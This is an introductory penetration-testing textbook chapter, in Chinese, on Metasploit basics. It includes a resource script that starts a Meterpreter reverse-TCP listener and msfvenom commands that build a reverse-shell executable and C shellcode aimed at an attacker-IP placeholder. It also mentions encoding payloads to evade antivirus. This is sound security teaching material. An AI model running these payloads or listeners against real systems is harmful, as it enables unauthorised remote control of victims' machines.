## METASPLOIT 基础

当你第一次接触 Metasploit 框架时，你可能会被其众多的接口、选项、工具、变量和模块所淹没。在本章中，我们将重点介绍基础知识，帮助你理解整体情况。我们将回顾一些渗透测试术语，然后简要介绍 Metasploit 提供的各种用户界面。Metasploit 本身是免费的开源软件，有许多安全社区的贡献者，但也有付费的商业版本（Metasploit Pro）。

当你开始使用 Metasploit 时，重要的是不要执着于掌握最新的漏洞利用；相反，应关注 Metasploit 如何运作以及你使用哪些命令来实现漏洞利用。

## 术语

在本书中，我们将使用各种技术术语。这里，我们在 Metasploit 的背景下定义这些术语，但它们在整个安全行业中的使用方式大致相同。

## 漏洞利用

漏洞利用是攻击者或渗透测试人员利用系统、应用程序或服务中缺陷的方式。攻击者使用漏洞利用来攻击系统，从而产生开发者从未预期的特定结果。常见的漏洞利用包括缓冲区溢出、Web 应用程序漏洞（如 SQL 注入）和配置错误。

## 载荷

载荷是我们希望系统执行的代码。例如，反向 shell 是一种载荷，它建立从目标机器到攻击者的连接，允许攻击者远程控制目标机器上的命令提示符（参见第 5 章），而绑定 shell 是一种将命令提示符“绑定”到目标机器上监听端口的载荷，攻击者随后可以连接到该端口。载荷也可以简单到只是在目标操作系统上执行的几条命令。你可以通过框架选择并传递各种载荷。

## Shellcode

Shellcode 是一组用作载荷的指令。Shellcode 通常用汇编语言编写。在大多数情况下，一旦目标机器执行了这些指令，它会为你提供一个命令 shell 或 Meterpreter shell，因此得名。

## 模块

在本书的上下文中，模块是可供框架使用的一段软件。有时，你可能需要使用漏洞利用模块来进行攻击。其他时候，可能需要辅助模块来扫描或枚举系统。这些可互换的模块是框架强大功能的核心。

## 监听器

监听器是 Metasploit 中的一个组件，它等待来自载荷的传入连接。例如，目标机器被利用后，载荷可能会通过互联网连接到攻击机器。攻击机器上运行的监听器处理来自被利用系统的连接。

## Metasploit 接口

Metasploit 为其底层功能提供了多种接口，包括控制台、命令行和图形界面。此外，其他工具提供了对通常属于 Metasploit 框架内部功能的直接访问。这些工具在漏洞利用开发或当你不需要整个框架时非常宝贵。

## MSFconsole

MSFconsole 无疑是 Metasploit 框架中最受欢迎的部分，并且有充分的理由。它是框架内几乎每个选项和设置最灵活、功能最丰富、支持最好的工具之一。MSFconsole 为你所有的漏洞利用梦想提供了一个便捷的一站式接口。你可以使用 MSFconsole 做任何事情，包括发起漏洞利用、加载辅助模块、执行枚举或创建监听器。

尽管 Metasploit 框架在不断变化，但有一小部分命令相对稳定。通过掌握 MSFconsole 的基础知识，你将能够跟上任何变化。为了说明学习 MSFconsole 的重要性，我们将在本书的几乎每一章中使用它。

要启动 MSFconsole，在命令行输入 `msfconsole`。你应该会看到 Metasploit 的启动横幅，然后是 MSFconsole 的提示符（`msf >`），其中可能包含版本号。这是你输入命令的地方：

```text
kali@kali:~$ sudo msfconsole < metasploit >
------------
  \  ,__,
   \ (oo)____
    (__) )\
       ||--|| *
msf6 >
```

如果你的操作系统没有将 MSFconsole 包含在默认路径中，你需要在启动前导航到包含 MSFconsole 二进制文件的目录。

要访问 MSFconsole 的帮助文件，输入 `help` 后跟你感兴趣的命令。例如，你可以搜索关于 `connect` 命令的信息，该命令允许我们与主机通信：

```bash
msf6 > help connect
```

生成的文档列出了用法、工具描述以及各种选项标志。我们将在后续章节中更深入地探讨 MSFconsole。

## 资源脚本

资源脚本是包含 Metasploit 命令和 Ruby 代码的短程序。与其在 MSFconsole 中手动输入命令，不如运行一个包含你要执行命令的资源脚本。这是自动化任务或与其他命令行工具互操作的好方法。

让我们看一个示例资源脚本，它在 443 端口上启动一个监听器：

```ruby
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <攻击者 IP 地址>
set LPORT 443
exploit
```

在第一行，`use` 命令选择要使用的 Metasploit 模块。这里，我们选择存储在 `exploit/multi` 文件夹中的 `handler` 模块。该模块接受（处理）来自目标机器上运行的载荷的传入连接。接下来，我们使用 `set` 命令指定载荷：一个 `reverse_tcp` shell，它告诉 handler 模块期望什么类型的连接。在这种情况下，模块应期望来自目标机器上运行的 Meterpreter shell 的 TCP 连接。

在接下来的两行中，我们使用 `LHOST`（监听主机）和 `LPORT`（监听端口）命令指定渗透测试人员机器的 IP 地址和端口。这些命令告诉载荷要连接到哪台机器和哪个端口。因此，我们告诉监听器在我们的机器的 443 端口上监听传入连接。

你可以使用任何文本编辑器创建这样的资源脚本。保存脚本后，使用 `-r` 标志运行它，并传递脚本的路径：

```bash
kali@kali:~$ sudo msfconsole -r ~/Desktop/start_listener.rc
```

输入以下命令列出 Metasploit 框架资源脚本目录中的资源脚本集合：

```bash
kali@kali:~$ ls /usr/share/metasploit-framework/scripts/resource
```

我们建议你熟悉这些脚本及其功能。

## Metasploit 工具

现在我们已经介绍了 Metasploit 的三个主要接口，是时候介绍一些工具了。Metasploit 的工具是对框架功能的直接接口，在特定情况下非常有用，尤其是在漏洞利用开发中。我们将在这里介绍一些更易用的工具，并在全书后续介绍其他工具。

## MSFvenom

Metasploit 的 MSFvenom 组件允许你生成 shellcode、可执行文件等，用于框架之外的漏洞利用。它可以生成多种语言的 shellcode，包括 C、Ruby、JavaScript 甚至 Visual Basic for Applications。例如，如果你在用 Python 编写漏洞利用，你会选择 Python 输出选项；但如果你在处理浏览器漏洞利用，JavaScript 输出可能最好。要查看该工具接受哪些选项，在命令行输入：

```bash
kali@kali:~$ sudo msfvenom -h
```

以下示例创建一个恶意可执行文件，该文件连接到我们之前使用资源脚本在攻击者 Kali Linux 机器上创建的监听器：

```bash
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<攻击者 IP 地址> -f exe -o payload.exe
```

`-p` 选项指定要使用的载荷类型。这里，我们使用的是 Meterpreter shell，它通过反向 TCP 连接到 handler。`LHOST` 选项指定监听主机，`-f` 选项指定输出类型（这里我们选择输出可执行文件），`-o` 标志指定文件名（`payload.exe`）。

当用户点击生成的 `payload.exe` 文件时，反向 shell 将激活并连接到 Kali 机器上运行的监听器。连接建立后，渗透测试人员将能够远程控制目标机器。

上面的示例生成了一个可执行文件。但是，如果你想生成一段 C 代码片段以包含在你正在开发的漏洞利用中，你可以选择 `c` 选项：

```bash
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<攻击者 IP 地址> -f c
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of c file: 1512 bytes
unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50"
"\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xc1"
```

MSFvenom 生成的 shellcode 功能完备，但可能包含几个空字符。例如，`\x00` 可能表示字符串的结束。这可能导致代码在完成前终止。这些 `\x00` 和 `\xff` 会破坏你的载荷！

此外，以明文形式在网络中传输的 shellcode 很可能被入侵检测系统和防病毒软件捕获，因为它们能识别载荷中十六进制值的模式。幸运的是，MSFvenom 通过以不包含“坏”字符并生成唯一十六进制模式的方式对原始载荷进行编码，帮助你规避防病毒和 IDS。我们将在第 7 章中介绍这些编码技术。

Metasploit 包含几种针对特定情况的编码器。有些在你只能使用字母数字字符作为载荷的一部分时很有用，许多文件格式漏洞利用或针对只接受可打印字符作为输入的应用程序时就是这种情况。其他则是出色的通用编码器，在任何情况下都表现良好。

不过，如果有疑问，使用 `x86/shikata_ga_nai` 编码器绝对不会错，它是唯一评级为“优秀”的编码器。Metasploit 中的评级是对模块可靠性和稳定性的衡量。在编码器的上下文中，“优秀”评级意味着它是最通用的编码器之一，并且可以比其他编码器进行更大程度的微调。要查看可用编码器列表，在 msfvenom 后附加 `-l`，然后是要列出的模块类型：

```bash
kali@kali:~$ msfvenom -l encoder
```

随着我们在后续章节中探索漏洞利用开发，我们将更深入地探讨 MSFvenom。

## NASM Shell

`nasm_shell.rb` 工具在你试图理解汇编代码时非常方便，尤其是在漏洞利用开发过程中，你需要识别给定汇编命令的操作码时。

例如，这里我们运行该工具并请求 `jmp esp` 命令的操作码：

```bash
kali@kali:/usr/share/metasploit-framework/tools/exploit$ sudo ./nasm_shell.rb
nasm > jmp esp
00000000  FFE4               jmp esp
```

该工具告诉我们这些操作码是 `FFE4`。

## Metasploit Pro

Metasploit Pro 是 Metasploit 框架的一个商业 Web 接口。它的工具提供了大量的自动化功能，使新用户更容易上手。此外，Metasploit Pro 中的报告工具可以加快渗透测试中最不受欢迎的方面之一：编写报告。

这个工具值得购买吗？只有你自己能做出选择。Metasploit 的商业版面向专业的渗透测试人员，可以简化工作中许多更常规的方面。如果自动化节省的时间对你来说有用，它们可能会证明购买价格是合理的。
